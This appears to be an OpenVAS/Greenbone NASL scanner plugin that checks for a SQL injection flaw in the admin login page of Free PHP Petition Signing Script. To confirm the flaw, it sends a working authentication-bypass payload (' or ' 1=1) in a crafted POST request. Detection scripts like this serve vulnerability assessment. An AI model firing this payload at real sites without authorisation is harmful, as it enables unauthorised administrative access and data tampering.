if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100088" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-03-29 17:14:47 +0200 (Sun, 29 Mar 2009)" );
	script_bugtraq_id( 34273 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Free PHP Petition Signing Script Login Page SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "Free PHP Petition Signing Script is prone to an SQL-injection
 vulnerability because it fails to sufficiently sanitize
 user-supplied data before using it in an SQL query." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
 application, access or modify data, or exploit latent
 vulnerabilities in the underlying database." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34273" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/petition", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/signing_system-admin/index.php" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(!buf){
		continue;
	}
	if(egrep( pattern: "Signing System", string: buf ) || egrep( pattern: "Script by Rediscussed\\.com", string: buf )){
		variables = NASLString( "username=%27%20or%20%27%201=1&password=" );
		url = NASLString( dir + "/signing_system-admin/index.php" );
		host = http_host_name( port: port );
		req = NASLString( "POST ", url, " HTTP/1.0\\r\\n", "Referer: ", "http://", host, url, "\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( variables ), "\\r\\n\\r\\n", variables );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(res == NULL){
			continue;
		}
		if(egrep( pattern: "<a href='logout.php[^>]*>Log Out</a>", string: res ) && egrep( pattern: "<a href='add-topic.php[^>]*>Add Topic</a>", string: res )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

